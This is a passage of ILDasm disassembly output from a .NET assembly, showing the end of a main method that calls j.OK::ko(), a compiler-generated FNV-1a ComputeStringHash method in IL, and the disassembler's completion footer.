    .custom instance void [mscorlib]System.STAThreadAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       6 (0x6)
    .maxstack  8
    IL_0000:  call       void j.OK::ko()
    IL_0005:  ret
  } // end of method A::main

} // end of class j.A

.class private auto ansi sealed '<PrivateImplementationDetails>'
       extends [mscorlib]System.Object
{
  .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
  .method assembly static uint32  ComputeStringHash(string s) cil managed
  {
    // Code size       44 (0x2c)
    .maxstack  2
    .locals init (uint32 V_0,
             int32 V_1)
    IL_0000:  ldc.i4     0x811c9dc5
    IL_0005:  stloc.0
    IL_0006:  ldarg.0
    IL_0007:  brfalse.s  IL_002a

    IL_0009:  ldc.i4.0
    IL_000a:  stloc.1
    IL_000b:  br.s       IL_0021

    IL_000d:  ldarg.0
    IL_000e:  ldloc.1
    IL_000f:  callvirt   instance char [mscorlib]System.String::get_Chars(int32)
    IL_0014:  ldloc.0
    IL_0015:  xor
    IL_0016:  ldc.i4     0x1000193
    IL_001b:  mul
    IL_001c:  stloc.0
    IL_001d:  ldloc.1
    IL_001e:  ldc.i4.1
    IL_001f:  add
    IL_0020:  stloc.1
    IL_0021:  ldloc.1
    IL_0022:  ldarg.0
    IL_0023:  callvirt   instance int32 [mscorlib]System.String::get_Length()
    IL_0028:  blt.s      IL_000d

    IL_002a:  ldloc.0
    IL_002b:  ret
  } // end of method '<PrivateImplementationDetails>'::ComputeStringHash

} // end of class '<PrivateImplementationDetails>'


// =============================================================

// *********** DISASSEMBLY COMPLETE ***********************
// WARNING: Created Win32 resource file C:\xx\bin\Release\Stuvb.res
